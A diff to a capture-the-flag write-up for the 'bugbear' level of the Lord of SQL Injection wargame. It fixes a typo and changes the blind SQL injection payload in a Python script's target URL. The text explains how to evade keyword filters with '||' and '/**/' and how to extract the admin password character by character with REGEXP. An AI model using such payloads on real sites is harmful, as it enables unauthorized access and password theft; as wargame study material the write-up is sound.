@@ -23,7 +23,7 @@
 ?>
 ```
 
-Here we have to get the admins password but there are so many filtered words. So we have to use `REGEXP` in mysql to find patterns in the passeord and get the password using bind injection. We also have to use `||` instead of `or` and `/**/` instead of whitespace.
+Here we have to get the admins password but there are so many filtered words. So we have to use `REGEXP` in mysql to find patterns in the password and get the password using bind injection. We also have to use `||` instead of `or` and `/**/` instead of whitespace.
 
 I made a script to do that
 
@@ -33,7 +33,7 @@ import string
 
 session = requests.Session()
 
-url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/pw/**/REGEXP/**/"[[:<:]]{}"'
+url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/pw/**/REGEXP/**/"^{}"'
 cookies = {"PHPSESSID": "lmscmn6uu5q675j19npln84ik4"}
 pw = ""
 for j in range(8):
